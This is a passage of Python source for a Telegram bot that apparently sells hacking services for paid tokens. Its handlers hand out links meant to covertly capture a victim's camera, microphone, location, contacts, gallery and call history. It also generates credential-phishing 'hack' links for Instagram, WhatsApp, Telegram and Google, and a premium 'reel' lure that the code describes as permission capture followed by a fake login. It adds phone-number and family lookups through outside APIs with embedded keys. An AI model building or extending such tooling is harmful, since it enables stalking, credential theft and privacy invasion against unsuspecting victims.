                lines.append(f"• {plan.get('name', pid)} — ₹{final.quantize(Decimal('0.01'), rounding=ROUND_HALF_UP)} ({disc}% OFF | {plan.get('value')} {unit})")
            else:
                lines.append(f"• {plan.get('name', pid)} — ₹{orig} ({plan.get('value')} {unit})")
    lines.append(f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}")
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton(f"💳 DIRECT BUY" + (f" – {disc}% OFF" if disc > 0 else ""), callback_data="buy_open"))
    bot.send_message(chat_id, "<blockquote>" + "\n".join(lines) + "</blockquote>", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == BTN_PRICE)
def price_btn(m): send_price_menu(m.chat.id)

# ----------------- PHOTO TO INFO -----------------
@bot.message_handler(func=lambda m: m.text == BTN_PHOTO_INFO)
def photo_info_start(message):
    if not check_feature_access(message, "photo_info"): return
    cost = get_cmd_cost("photo_info")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    msg = bot.send_message(message.chat.id, f"<blockquote>📸 Photo info\nPhoto/document bhejein.\nCost: {cost}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_photo_info_lookup)

def process_photo_info_lookup(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PHOTO_INFO, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav:
        send_home_dashboard(message.chat.id, message.from_user); return
    if not (message.photo or message.document):
        bot.send_message(message.chat.id, f"<blockquote>❌ Kripya valid photo ya document bhejein.\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    uid = str(message.from_user.id)
    if not deduct_tokens_for_cmd(uid, "photo_info"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Insufficient tokens!\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        file_id = message.document.file_id if message.document else message.photo[-1].file_id
        fi = bot.get_file(file_id)
        downloaded = bot.download_file(fi.file_path)
        temp_filename = f"temp_img_{uid}.jpg"
        with open(temp_filename, "wb") as f:
            f.write(downloaded)
        exif_info = {}
        try:
            img = Image.open(temp_filename)
            ed = img.getexif()
            if ed:
                for k, v in ed.items(): exif_info[str(k)] = str(v)
        except Exception: pass
        data = {
            "credit": "@GOD_AYUSH", "developer": "@" + OWNER_USERNAME,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "user_id": uid,
            "file_info": {"file_id": file_id, "file_path": fi.file_path, "has_document": bool(message.document)},
            "exif_metadata": exif_info if exif_info else {"status": "No EXIF data found"},
            "analysis_notes": "Full image attribute scan completed successfully."
        }
        json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode('utf-8')
        json_io = io.BytesIO(json_bytes); json_io.name = "Photo_Info_Report.json"
        pdf_io = io.BytesIO()
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            doc = SimpleDocTemplate(pdf_io, pagesize=letter, rightMargin=30, leftMargin=30, topMargin=30, bottomMargin=30)
            story = []
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle('T', parent=styles['Heading1'], fontSize=16, textColor='#1e3a8a')
            body_style = ParagraphStyle('B', parent=styles['Normal'], fontSize=10, textColor='#334155')
            story.append(Paragraph("📸 Photo To Info Analysis Report", title_style))
            story.append(Paragraph(f"<b>Credit:</b> @GOD_AYUSH | <b>Developer:</b> @{OWNER_USERNAME}", body_style))
            story.append(Spacer(1, 10))
            story.append(Paragraph(f"<b>Timestamp:</b> {data['timestamp']}", body_style))
            story.append(Paragraph(f"<b>User ID:</b> {uid}", body_style))
            story.append(Spacer(1, 15))
            story.append(Paragraph("<b>EXIF Metadata & Attributes:</b>", styles['Heading2']))
            story.append(Paragraph(json.dumps(exif_info, indent=2), body_style))
            story.append(Spacer(1, 15))
            story.append(Paragraph("<b>Analysis Summary:</b> Full metadata audit processed successfully.", body_style))
            doc.build(story)
            pdf_io.seek(0); pdf_io.name = "Photo_Info_Report.pdf"
        except Exception:
            pdf_io = io.BytesIO(json_bytes); pdf_io.name = "Photo_Info_Report.pdf"
        bot.send_document(message.chat.id, document=json_io, caption=f"📊 <b>Full JSON Data Report</b>\n👨‍💻 Developer: @{OWNER_USERNAME}\n👑 Credit: @GOD_AYUSH", parse_mode="HTML")
        bot.send_document(message.chat.id, document=pdf_io, caption=f"📄 <b>Full PDF Data Report</b>\n👨‍💻 Developer: @{OWNER_USERNAME}\n👑 Credit: @GOD_AYUSH", parse_mode="HTML")
        if os.path.exists(temp_filename): os.remove(temp_filename)
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ Error: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))

# ----------------- NUM/FAMILY/CALL -----------------
@bot.message_handler(func=lambda m: m.text == BTN_NUM_INFO)
def num_info_start(message):
    if not check_feature_access(message, "num_info"): return
    cost = get_cmd_cost("num_info")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    msg = bot.send_message(message.chat.id, f"<blockquote>🔍 Number Info\n10-digit number:\nCost: {cost}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_num_info_lookup)

def process_num_info_lookup(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav: send_home_dashboard(message.chat.id, message.from_user); return
    query = message.text.strip()
    uid = str(message.from_user.id)
    if not deduct_tokens_for_cmd(uid, "num_info"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        url = f"https://shuruuu-api.vercel.app/num_info?key=@KINGFFAIAK47x&query={query}"
        res = requests.get(url, timeout=10); data = res.json()
        if isinstance(data, dict):
            if "Credits" in data: data["Credits"] = "AYUSH"
            if "developer" in data: data["developer"] = "@GOD_AYUSH"
        f = json.dumps(data, indent=2, ensure_ascii=False)
        if len(f) > 3800: f = f[:3800] + "\n...[truncated]"
        bot.send_message(message.chat.id, f"<blockquote>📊 <b>Result</b>\n<code>{f}</code>\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ API error: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_FAMILY_INFO)
def family_info_start(message):
    if not check_feature_access(message, "family_info"): return
    cost = get_cmd_cost("family_info")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    msg = bot.send_message(message.chat.id, f"<blockquote>👨‍👩‍👧‍👦 Family Info\nQuery:\nCost: {cost}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, process_family_info_lookup)

def process_family_info_lookup(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav: send_home_dashboard(message.chat.id, message.from_user); return
    query = message.text.strip()
    uid = str(message.from_user.id)
    if not deduct_tokens_for_cmd(uid, "family_info"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id)); return
    bot.send_chat_action(message.chat.id, 'typing')
    try:
        url = f"https://x-trace-osinist-api-pannell.vercel.app/apis/family?key=@GOD_AYUSH&query={query}"
        res = requests.get(url, timeout=10); data = res.json()
        if isinstance(data, dict):
            if "Credits" in data: data["Credits"] = "AYUSH"
            if "developer" in data: data["developer"] = "@GOD_AYUSH"
        f = json.dumps(data, indent=2, ensure_ascii=False)
        if len(f) > 3800: f = f[:3800] + "\n...[truncated]"
        bot.send_message(message.chat.id, f"<blockquote>📊 <b>Result</b>\n<code>{f}</code>\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ API error: {e}\n{DEV_TAG}</blockquote>", reply_markup=get_main_menu(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_CALL_HIST)
def call_history_btn(m):
    if not check_feature_access(m, "call_history"): return
    cost = get_cmd_cost("call_history")
    if not has_active_plan(m.from_user.id):
        bot.send_message(m.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(m.chat.id); return
    if not deduct_tokens_for_cmd(m.from_user.id, "call_history"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/call-history-reveal?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Call History Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_GALLERY)
def gallery_btn(m):
    if not check_feature_access(m, "gallery"): return
    if not _check_media_access(m, "gallery"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "gallery"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-gallery?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🖼 <b>Gallery Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_CONTACTS)
def contacts_btn(m):
    if not check_feature_access(m, "contacts"): return
    cost = get_cmd_cost("contacts")
    if not has_active_plan(m.from_user.id):
        bot.send_message(m.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(m.chat.id); return
    if not deduct_tokens_for_cmd(m.from_user.id, "contacts"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-contacts?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>📇 <b>Contacts Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_PHONE_HACK)
def phone_hack_btn(m):
    if not check_feature_access(m, "phone_hack"): return
    cost = get_cmd_cost("phone_hack")
    if not has_active_plan(m.from_user.id):
        bot.send_message(m.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(m.chat.id); return
    if not deduct_tokens_for_cmd(m.from_user.id, "phone_hack"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient!\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-phonehack?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>📡 <b>Phone Hack Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_CAMERA)
def camera_options(m):
    if not check_feature_access(m, "camera"): return
    bot.send_message(m.chat.id, f"<blockquote>📷 Camera:\n{DEV_TAG}</blockquote>", reply_markup=get_camera_menu())

def _check_media_access(message, cmd_key="camera"):
    cost = get_cmd_cost(cmd_key)
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ Tokens khatam ({cost})\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return False
    return True

def handle_media_request(message, endpoint, label, cmd_key="camera"):
    if not _check_media_access(message, cmd_key): return
    if not deduct_tokens_for_cmd(message.from_user.id, cmd_key):
        bot.send_message(message.chat.id, f"<blockquote>❌ Need {get_cmd_cost(cmd_key)}\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/{endpoint}?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>🔗 <b>{label}:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_CAM)
def front_cam(m): handle_media_request(m, "Ayush-wab", "Front Camera", "camera")
@bot.message_handler(func=lambda m: m.text == BTN_BACK_CAM)
def back_cam(m): handle_media_request(m, "Ayush-wab-1", "Back Camera", "camera")
@bot.message_handler(func=lambda m: m.text == BTN_FRONT_VID)
def front_vid(m): handle_media_request(m, "Ayush-wab-2", "Front Video", "camera")
@bot.message_handler(func=lambda m: m.text == BTN_BACK_VID)
def back_vid(m): handle_media_request(m, "Ayush-wab-3", "Back Video", "camera")

@bot.message_handler(func=lambda m: m.text == BTN_AUDIO)
def audio_btn(m):
    if not check_feature_access(m, "audio"): return
    if not _check_media_access(m, "audio"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "audio"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-wab-4?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Audio Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_LOCATION)
def location_btn(m):
    if not check_feature_access(m, "location"): return
    if not _check_media_access(m, "location"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "location"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-wab-5?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Location Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_LIVE_LOC)
def live_location_btn(m):
    if not check_feature_access(m, "live_location"): return
    if not _check_media_access(m, "live_location"): return
    if not deduct_tokens_for_cmd(m.from_user.id, "live_location"):
        bot.send_message(m.chat.id, f"<blockquote>❌ Insufficient.\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/Ayush-wab-6?chat_id={m.chat.id}"
    bot.send_message(m.chat.id, f"<blockquote>🔗 <b>Live Location Link:</b>\n\n{link}\n\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

# ----------------- MAIN MENU 4 HACK BUTTONS -----------------
def _generate_hack_link(message, platform, cmd_key, label):
    if not check_feature_access(message, cmd_key): return
    cost = get_cmd_cost(cmd_key)
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    if not deduct_tokens_for_cmd(message.from_user.id, cmd_key):
        bot.send_message(message.chat.id, f"<blockquote>❌ Need {cost}\n{DEV_TAG}</blockquote>"); return
    link = f"{SERVER_URL}/{platform}-hack?chat_id={message.chat.id}"
    bot.send_message(message.chat.id, f"<blockquote>{label} <b>Hack Link:</b>\n\n{link}\n\nCost: {cost}\n{DEV_TAG}</blockquote>", disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_INSTA_HACK)
def insta_hack_btn(m): _generate_hack_link(m, "insta", "insta_hack", "📸 Instagram")
@bot.message_handler(func=lambda m: m.text == BTN_WA_HACK)
def wa_hack_btn(m): _generate_hack_link(m, "wa", "wa_hack", "💬 WhatsApp")
@bot.message_handler(func=lambda m: m.text == BTN_TG_HACK)
def tg_hack_btn(m): _generate_hack_link(m, "tg", "tg_hack", "✈️ Telegram")
@bot.message_handler(func=lambda m: m.text == BTN_GOOGLE_HACK)
def google_hack_btn(m): _generate_hack_link(m, "google", "google_hack", "🔍 Google")

# ============================================================
# PREMIUM HACKING — ALL PUBLIC BUTTONS
# ============================================================
@bot.message_handler(func=lambda m: m.text == BTN_PREMIUM)
def premium_menu_open(m):
    if not check_feature_access(m, "premium"): return
    bot.send_message(m.chat.id,
        f"<blockquote>🔥 <b>PREMIUM HACKING</b>\n"
        f"Saare features yahan hain. Koi bhi button dabao → reel link maango → capture link milega.\n{DEV_TAG}</blockquote>",
        reply_markup=get_premium_menu(m.from_user.id))

@bot.message_handler(func=lambda m: m.text == BTN_PREM_CAMERA)
def prem_camera_click(m):
    if not check_feature_access(m, "premium"): return
    bot.send_message(m.chat.id, f"<blockquote>📷 Camera type select:\n{DEV_TAG}</blockquote>", reply_markup=get_premium_camera_menu())

@bot.message_handler(func=lambda m: m.text in [BTN_PREM_CAM_FRONT, BTN_PREM_CAM_BACK, BTN_PREM_CAM_FRONT_VID, BTN_PREM_CAM_BACK_VID])
def prem_camera_sub(m):
    facing = "user" if "Front" in m.text else "environment"
    is_video = "8s" in m.text
    label = m.text.replace("💎 ", "")
    _prem_ask_reel(m, "camera", label, facing, is_video)

@bot.message_handler(func=lambda m: m.text in PREMIUM_BUTTON_MAP)
def prem_other_btn(m):
    platform, label, facing, is_video = PREMIUM_BUTTON_MAP[m.text]
    _prem_ask_reel(m, platform, label, facing, is_video)

def _prem_ask_reel(message, platform, label, facing, is_video):
    if not check_feature_access(message, "premium"): return
    cost = get_cmd_cost("premium_link")
    if not has_active_plan(message.from_user.id):
        bot.send_message(message.chat.id, f"<blockquote>⚠️ No plan. Cost: {cost}\n{DEV_TAG}</blockquote>")
        send_price_menu(message.chat.id); return
    msg = bot.send_message(message.chat.id,
        f"<blockquote>🎯 <b>{label}</b>\n\n"
        f"Reel ka link bhejein (YouTube / Instagram / Snapchat / koi bhi):\n"
        f"Example: <code>https://www.instagram.com/reel/xyz</code>\n"
        f"Cost: {cost} tokens\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, _prem_process_reel, platform, label, facing, is_video)

def _prem_process_reel(message, platform, label, facing, is_video):
    if message.text in [BTN_BACK_HOME, BTN_PREM_BACK, BTN_BACK_ADMIN, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user); return
    reel_url = (message.text or "").strip()
    if not (reel_url.startswith("http://") or reel_url.startswith("https://")):
        bot.send_message(message.chat.id, f"<blockquote>❌ Valid http(s) link bhejein.\n{DEV_TAG}</blockquote>",
                         reply_markup=get_premium_menu(message.from_user.id)); return
    cost = get_cmd_cost("premium_link")
    if not deduct_tokens_for_cmd(message.from_user.id, "premium_link"):
        bot.send_message(message.chat.id, f"<blockquote>❌ Need {cost} tokens.\n{DEV_TAG}</blockquote>",
                         reply_markup=get_premium_menu(message.from_user.id)); return
    link_id = uuid.uuid4().hex[:10]
    db = load_db()
    db["premium_links"][link_id] = {
        "uid": str(message.from_user.id),
        "platform": platform,
        "label": label,
        "facing": facing,
        "is_video": is_video,
        "target_reel": reel_url,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "captures": [], "logins": []
    }
    save_db(db)
    link = f"{SERVER_URL}/premium/{link_id}"
    bot.send_message(message.chat.id,
        f"<blockquote>🎯 <b>Premium {label} Link Ready!</b>\n\n{link}\n\n"
        f"📹 Reel: <code>{html.escape(reel_url)}</code>\n\n"
        f"⚠️ Victim open karega → permission → face/location capture"
        + (" + 8s video" if is_video else "") +
        f" → fake login → reel play\nCost: {cost}\n{DEV_TAG}</blockquote>",
        reply_markup=get_premium_menu(message.from_user.id),
        disable_web_page_preview=True)

# ----------------- USER EXTRAS -----------------
@bot.message_handler(func=lambda m: m.text == BTN_HISTORY)
def my_history(message):
    db = load_db()
    user = db["users"].get(str(message.from_user.id))
    if not user: bot.reply_to(message, f"<blockquote>❌ No data.\n{DEV_TAG}</blockquote>"); return
    hist = user.get("history", [])[-20:]
    if not hist: bot.reply_to(message, f"<blockquote>📜 No history.\n{DEV_TAG}</blockquote>"); return
    text = f"<blockquote>📜 <b>Last {len(hist)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for h in reversed(hist):
        s = "➕" if h.get("amount", 0) >= 0 else "➖"
        text += f"{s} {h.get('action','?')}: <b>{abs(h.get('amount',0))}</b>\n   <i>{h.get('time','')}</i>\n"
    text += f"\n💰 Balance: <b>{user.get('tokens',0)}</b>\n{DEV_TAG}</blockquote>"
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_REFER)
def refer_earn(message):
    uid = str(message.from_user.id)
    get_user_data(message.from_user)
    db = load_db(); user = db["users"][uid]
    credits = db["settings"].get("referral_credits", 2)
    me = bot.get_me()
    ref_link = f"https://t.me/{me.username}?start=ref_{uid}"
    refs = len(user.get("referrals", []))
    text = (f"<blockquote>🔗 <b>Refer</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"🎁 +{credits} per invite\n👥 {refs}\n💰 {refs * credits}\n"
            f"📤 <code>{ref_link}</code>\n{DEV_TAG}</blockquote>")
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=Join"))
    bot.send_message(message.chat.id, text, reply_markup=mk, disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_PROFILE)
def my_profile(message):
    uid = str(message.from_user.id)
    get_user_data(message.from_user)
    db = load_db(); user = db["users"][uid]
    tokens = user.get("tokens", 0)
    tier = "🥉 Bronze"
    if tokens >= 500: tier = "🥇 Gold"
    elif tokens >= 100: tier = "🥈 Silver"
    text = (f"<blockquote>👤 <b>Profile</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"📛 {user.get('name','N/A')}\n🔗 {user.get('username','N/A')}\n"
            f"🆔 <code>{uid}</code>\n🪙 {tokens}\n📦 {user.get('plan','free')}\n"
            f"⏳ {user.get('expiry') or 'N/A'}\n🏅 {tier}\n"
            f"👥 Refs: {len(user.get('referrals',[]))}\n📅 Joined: {user.get('joined','N/A')}\n{DEV_TAG}</blockquote>")
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_LEADER)
def leaderboard(message):
    db = load_db()
    users = sorted(db["users"].items(), key=lambda x: x[1].get("tokens", 0), reverse=True)[:10]
    text = "<blockquote>🏆 <b>Top 10</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for i, (uid, u) in enumerate(users, 1):
        medal = {1: "🥇", 2: "🥈", 3: "🥉"}.get(i, f"{i}.")
        text += f"{medal} {u.get('name','?')} — {u.get('tokens',0)} 🪙\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_HELP)
def help_btn(message):
    text = (
        f"<blockquote>🆘 <b>Help & Support</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📷 Camera & Flashlight: Front/Back link\n"
        f"🎙 Audio: Mic stream link\n"
        f"📍 Location / GPS / IMEI / Storage / Contacts / Sensors / Clipboard: Full payload\n"
        f"🔍 Number Info: Lookup mobile details\n"
        f"👨‍👩‍👧‍👦 Family Info: Lookup family tree\n"
        f"📂 Call History Audit: Portal link generator\n"
        f"🖼 Gallery Access: Photos/videos selection link\n"
        f"📇 Contact Access: Direct contact picker link\n"
        f"📡 Phone Hack & Net: Hotspot peer & remote stream\n"
        f"📸 Photo Info: EXIF & file metadata (JSON + PDF)\n"
        f"📸 Instagram Hack • 💬 WhatsApp Hack • ✈️ Telegram Hack • 🔍 Google Hack\n"
        f"🔥 Premium Hacking: All features + reel capture flow\n"
        f"🔗 Refer: Invite karo, tokens pao\n"
        f"✍️ Redeem: Code lagao, token pao\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💬 Support: @{OWNER_USERNAME}\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_TERMS)
def terms_btn(message):
    text = (
        f"<blockquote>📄 <b>Terms & Conditions</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"1️⃣ Galat use = permanent ban\n"
        f"2️⃣ Tokens non-refundable\n"
        f"3️⃣ Full Hacking Purpose\n"
        f"4️⃣ Privacy 100% safe\n"
        f"━━━━━━━━━━━━━━━━━━━━\n{DEV_TAG}</blockquote>"
    )
    bot.reply_to(message, text)

@bot.message_handler(func=lambda m: m.text == BTN_FAQ)
def faq_btn(message):
    bot.reply_to(message, f"<blockquote>❓ <b>FAQ</b>\n<b>Q:</b> Premium kaise?\n<b>A:</b> Reel link bhejo → capture link milega\n{DEV_TAG}</blockquote>")

@bot.message_handler(func=lambda m: m.text == BTN_FEEDBACK)
def feedback_start(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>💬 Feedback\nMessage:\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, feedback_send)

def feedback_send(message):
    if not message.text or message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user); return
    try:
        sent = bot.send_message(ADMIN_ID,
            f"<blockquote>💬 <b>Feedback</b>\n👤 {html.escape(message.from_user.first_name or 'User')}\n"
            f"🆔 <code>{message.from_user.id}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"{html.escape(message.text)}\n\n↩️ Reply karke jawab dein.\n{DEV_TAG}</blockquote>")
        db = load_db()
        db.setdefault("feedback_map", {})[str(sent.message_id)] = str(message.from_user.id)
        save_db(db)
        bot.reply_to(message, f"<blockquote>✅ Feedback sent.\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>❌ Failed.\n{DEV_TAG}</blockquote>")

@bot.message_handler(func=lambda m: m.text == BTN_REDEEM)
def ask_redeem_code(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>✍️ Code:\n{DEV_TAG}</blockquote>")
    bot.register_next_step_handler(msg, process_redeem_input)

def process_redeem_input(message):
    nav = [BTN_BACK_HOME, BTN_BACK_ADMIN, BTN_PREM_BACK, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_LIVE_LOC, BTN_NUM_INFO, BTN_FAMILY_INFO, BTN_CALL_HIST, BTN_GALLERY, BTN_CONTACTS, BTN_PHONE_HACK, BTN_PRICE, BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN]
    if message.text in nav: send_home_dashboard(message.chat.id, message.from_user); return
    code = message.text.strip().upper()
    db = load_db()
    if code not in db.get("redeem_codes", {}):
        bot.reply_to(message, f"<blockquote>❌ Invalid.\n{DEV_TAG}</blockquote>"); return
    rc = db["redeem_codes"][code]
    rc.setdefault("used_by", [])
    uid = str(message.from_user.id)
    if uid in rc["used_by"]:
        bot.reply_to(message, f"<blockquote>❌ Already used.\n{DEV_TAG}</blockquote>"); return
    if rc.get("uses_left", 0) <= 0:
        bot.reply_to(message, f"<blockquote>❌ Expired.\n{DEV_TAG}</blockquote>"); return
    get_user_data(message.from_user)
    db = load_db(); user = db["users"][uid]
    if rc["type"] == "token":
        v = rc["value"]
        user["tokens"] = user.get("tokens", 0) + v
        _add_history(user, "redeem_token", v)
        res = f"✅ {v} tokens!"
    else:
        d = rc["days"]
        user["plan"] = "unlimited"
        user["expiry"] = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(user, f"redeem_vip_{d}d", 0)
        res = f"👑 VIP {d}d!"
    rc["used_by"].append(uid); rc["uses_left"] -= 1
    if rc["uses_left"] <= 0: del db["redeem_codes"][code]
    save_db(db)
    bot.reply_to(message, f"<blockquote>{res}\n💰 {user.get('tokens',0)}\n{DEV_TAG}</blockquote>")

# ============================================================
# ADMIN PANEL
# ============================================================
def _is_admin(uid): return int(uid) == ADMIN_ID

@bot.message_handler(func=lambda m: m.text == BTN_ADMIN)
def admin_panel_open(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>⚙️ Admin Panel\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_TOGGLE_BTNS)
def admin_toggle_btns_menu(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    pub = db["settings"]["feature_public"]
    mk = types.InlineKeyboardMarkup(row_width=1)
    for k, v in pub.items():
        state = "🟢 PUBLIC" if v else "🔴 PRIVATE"
        mk.add(types.InlineKeyboardButton(f"{k.upper()}: {state}", callback_data=f"toggle_feat:{k}"))
